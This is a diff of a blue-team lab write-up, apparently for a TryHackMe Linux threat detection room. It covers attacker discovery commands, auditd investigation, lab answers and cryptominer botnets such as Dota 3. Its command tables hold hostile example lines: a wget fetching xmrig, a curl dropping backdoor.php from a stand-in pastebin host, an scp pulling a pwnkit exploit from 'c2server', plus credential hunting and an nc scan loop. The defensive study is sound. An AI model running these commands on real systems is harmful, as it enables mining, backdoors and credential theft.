@@ -1,75 +1,86 @@
   
 
-Discovery 
+Discovery
+---
 - When a botnet has breached a Linux system, the first thing an adversary want to know is where they are and how they appeared there.  
     
 First Actions 
+---
 - The commands that an adversary will run are usually discovery of commands to determine their location within a system. 
     
 |   |   |
 |---|---|
-|Discovery Goal|Typical Commands|
-|OS and Filesystem Discovery|pwd, ls /, env, uname -a, lsb_release -a, hostname|
-|User and Groups Discovery|id, whoami, w, last, cat /etc/sudoers, cat /etc/passwd|
-|Process and Network Discovery|ps aux, top, ip a, ip r, arp -a, ss -tnlp, netstat -tnlp|
-|Cloud or Sandbox Discovery|systemd-detect-virt, lsmod, uptime, pgrep "<edr-or-sandbox>"|
+|**Discovery Goal**|**Typical Commands**|
+|OS and Filesystem Discovery|`pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname`|
+|User and Groups Discovery|`id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passw`d|
+|Process and Network Discovery|`ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp`|
+|Cloud or Sandbox Discovery|`systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<edr-or-sandbox>"`|
 
-1. Run systemd-detect-virt to detect the system’s cloud. What is the command output?  
+**Questions**
+
+**1. Run `systemd-detect-virt` to detect the system’s cloud. What is the command output?**  
 - We are executing the command above to discover which Cloud was detected.  
     
 ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/45e7b384e28b7bcb70044a4105aa56da79d6d434/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%202/Linux%20Threat%20Detection%202%20Img/234.png) 
 
-2. Run ps aux and look for EDR or antivirus processes. What is the full path to detect antimalware binary?  
-- Since this EDR/antivirus is in the binary, we can grep for bin or scan to find the full path  
-- Ps aux | grep scan or ps aux | grep bin 
+**2. Run ps aux and look for EDR or antivirus processes. What is the full path to detect antimalware binary?**  
+- Since this EDR/antivirus is in the binary, we can `grep` for `bin` or `scan` to find the full path  
+- `Ps aux | grep scan or ps aux | grep bin` 
 ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/45e7b384e28b7bcb70044a4105aa56da79d6d434/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%202/Linux%20Threat%20Detection%202%20Img/235.png)
  
-	Specialized Discovery  
+Specialized Discovery
+--- 
 
-	- After the initial discovery, the adversary might utilize focus commnads to achieve their goals.  
+- After the initial discovery, the adversary might utilize focus commnads to achieve their goals.  
     
 |   |   |
 |---|---|
-|Attack Objectives|Typical Commands|
-|Find and steal credentials and other sensitive data|history \| grep pass, find / -name .env, find /home -name id_rsa|
-|Identify how suitable the system is for crypto mining|cat /proc/cpuinfo, lscpu \| grep Model, free -m, top, htop|
-|Scan the internal network for other future victims|ping <ip>, for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done|
+|**Attack Objectives**|**Typical Commands**|
+|Find and steal credentials and other sensitive data|`history \`| `grep pass`, `find / -name .env`, `find /home -name id_rsa`|
+|Identify how suitable the system is for crypto mining|`cat /proc/cpuinfo`, `lscpu \| grep Model`, `free -m`, `top`, `htop`|
+|Scan the internal network for other future victims|`ping <ip>`, for `ip` in `192.168.1.{1..254}`; do `nc -w 1 $ip 22` done|
 
-Red Flags  
-- Whoami: server spawning whoami 
-- find and grep: IT members looking for secrets 
-- Ping: A network monitoring tool being used 
-    
-1. What is the path of the script that initiated the “hostname” command? 
+Red Flags
+--
+- `Whoami`: server spawning whoami 
+- `find` and `grep`: IT members looking for secrets 
+- `Ping`: A network monitoring tool being used 
+
+Questions
+
+**1. What is the path of the script that initiated the “hostname” command?** 
 - First we need to use ausearch to find the executed hostname command 
-- *ausearch –i –x hostname* 
+- `ausearch –i –x hostname` 
 ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/45e7b384e28b7bcb70044a4105aa56da79d6d434/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%202/Linux%20Threat%20Detection%202%20Img/236.png)
 
-- Second, we see a cwd=home/itsupport that is the path of the script that executed the hostname command. 
-- Lets use the reverse method of the process tree to determine the script that executed the hostname command starting with the ppid 3771 
-- Ausearch –i –pid 3771 
+- Second, we see a `cwd=home/itsupport` that is the path of the script that executed the hostname command. 
+- Lets use the reverse method of the process tree to determine the script that executed the hostname command starting with the `ppid 3771` 
+- `ausearch –i –pid 3771` 
   ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/45e7b384e28b7bcb70044a4105aa56da79d6d434/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%202/Linux%20Threat%20Detection%202%20Img/237.png)
   
-- above we see a “debug.sh” script that is the ppid of the 3771 
-- We could also follow the path of home/itsupport to determine the script. 
+- above we see a `debug.sh` script that is the ppid of the 3771 
+- We could also follow the path of `home/itsupport` to determine the script. 
 
 ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/45e7b384e28b7bcb70044a4105aa56da79d6d434/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%202/Linux%20Threat%20Detection%202%20Img/238.png)
 ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/45e7b384e28b7bcb70044a4105aa56da79d6d434/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%202/Linux%20Threat%20Detection%202%20Img/239.png)
 
 Answer: home/itsupport/debug.sh 
 
-2. What was the last Discovery command launched by the script?  
-- We already cat the debug.sh, so the answer will be in the results  
+**2. What was the last Discovery command launched by the script?**  
+- We already `cat` the `debug.sh`, so the answer will be in the results  
 ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/45e7b384e28b7bcb70044a4105aa56da79d6d434/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%202/Linux%20Threat%20Detection%202%20Img/240.png)
 Answer: ps –eo, ppid,cmd,%cpu –sort=-%cp 
 
-3. Looking at the script content, what is the email of the script author?  
-	Answer: [greg@tryhackme.thm]
+**3. Looking at the script content, what is the email of the script author?**  
+Answer: [greg@tryhackme.thm]
 
-	Hack and Forget Attacks  
-	- These run at scale and focus on quick gains.  
-	- Install Cryptominer: Earn money by using the victim’s CPU/GPU to mine cryptocurrency 
-    
+Hack and Forget Attacks
+--- 
+- These run at scale and focus on quick gains.  
+
+**Install Cryptominer**
+
+- Earn money by using the victim’s CPU/GPU to mine cryptocurrency 
 	- T1059: Command and Scripting Interpreter ([Command and Scripting Interpreter, Technique T1059 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1059/)) 
 		- Tactic: Execution  
 			- Adversaries use scripts (powershell, bash, python) to download and execute mining payloads.  
@@ -91,45 +102,52 @@ Answer: ps –eo, ppid,cmd,%cpu –sort=-%cp 
 
 |   |   |
 |---|---|
-|Command|Usage Example|
-|Wget: Download a file from the website|wget [https://github.com/xmrig/[...]/xmrig-x64.tar.gz](https://github.com/xmrig/[...]/xmrig-x64.tar.gz) -O /tmp/miner.tar.gz|
-|Curl: Make a request to the webpage|curl --output /var/www/html/backdoor.php "[https://pastebin.thm/yTg0Ah6a](https://pastebin.thm/yTg0Ah6a)"|
-|SSH: Transfer a file via [SCP or SFTP](https://www.redhat.com/en/blog/secure-file-transfer-scp-sftp)|scp [kali@c2server:/home/kali/cve-2021-4034.sh](mailto:kali@c2server:/home/kali/cve-2021-4034.sh) /tmp/cve-2021-4034.sh|
+|**Command**|**Usage Example**|
+|`wget`: Download a file from the website|`wget [https://github.com/xmrig/[...]/xmrig-x64.tar.gz](https://github.com/xmrig/[...]/xmrig-x64.tar.gz) -O /tmp/miner.tar.gz`|
+|`curl`: Make a request to the webpage|`curl --output /var/www/html/backdoor.php "[https://pastebin.thm/yTg0Ah6a](https://pastebin.thm/yTg0Ah6a)"`|
+|`SSH`: Transfer a file via [SCP or SFTP](https://www.redhat.com/en/blog/secure-file-transfer-scp-sftp)|`scp [kali@c2server:/home/kali/cve-2021-4034.sh](mailto:kali@c2server:/home/kali/cve-2021-4034.sh) /tmp/cve-2021-4034.sh`|
 
-1. From which domain was the Elastic agent downloaded?  
-- We can use one on the command above and grep download 
-- *ausearch –i –x wget | grep download* 
+**Questions**
+
+**1. From which domain was the Elastic agent downloaded?**  
+- We can use one of the command above and grep download 
+- `ausearch –i –x wget | grep download` 
 ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/45e7b384e28b7bcb70044a4105aa56da79d6d434/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%202/Linux%20Threat%20Detection%202%20Img/241.png)
-	Answer: artifacts.elastic.co 
-2. What is the full path to the downloaded “helper.sh” script? 
-	- To simplify the search, we can use *ausearch –i | grep helper.sh* 
-	- The command above is making the daemons logs into human-readable files and we are greping helper.sh to reduce the amount of information that will be displayed as results. 
+
+Answer: artifacts.elastic.co
+
+**2. What is the full path to the downloaded “helper.sh” script?** 
+	- To simplify the search, we can use `ausearch –i | grep helper.sh` 
+	- The command above is making the daemons logs into human-readable files and we are grepping helper.sh to reduce the amount of information that will be displayed as results. 
  ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/45e7b384e28b7bcb70044a4105aa56da79d6d434/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%202/Linux%20Threat%20Detection%202%20Img/242.png)
-	Answer: /var/tmp/helper.sh 
+
+Answer: /var/tmp/helper.sh 
 	
-3. Which of the downloaded files is more likely to be malicious: wget or curl?
+**3. Which of the downloaded files is more likely to be malicious: wget or curl?**
  
 	Answer: curl  
 	- “.sh” is more likely to be a script that was downloaded from the website that have malicious intentions 
     
 
-Dota 3 Malware Analysis 
+Dota 3 Malware Analysis
+---
 
 - Is a known crypto-mining botnet that primarily targets Linux systems to hijack resources for mining Monero (XMR).  
     
 
 ([Outlaw Cybergang Attacking Targets Worldwide | Community Portal | Gurucul](https://community.gurucul.com/articles/ThreatResearch/Outlaw-Cybergang-Attacking-Targets-6-5-2025)) 
 
-Detecting the Attack 
+Detecting the Attack
+---
 
 - Dota 3 remains active becasue many administrators set weak ssh passwords. 
     
 
 |   |   |
 |---|---|
-|Log Source|Description|
-|Auth Logs: cat /var/log/auth.log \| grep "Accepted"|Look for successful SSH logins by password from untrusted, external IP addresses|
-|Auditd Process Logs: ausearch -i -x [command]|Look for execution of Discovery commands (e.g. uname, lscpu) and trace their origin|
+|**Log Source**|**Description**|
+|Auth Logs: `cat /var/log/auth.log \`| `grep "Accepted"`|Look for successful SSH logins by password from untrusted, external IP addresses|
+|Auditd Process Logs: `ausearch -i -x [command]`|Look for execution of Discovery commands (e.g. uname, lscpu) and trace their origin|
 
 ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/45e7b384e28b7bcb70044a4105aa56da79d6d434/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%202/Linux%20Threat%20Detection%202%20Img/243.png)
 
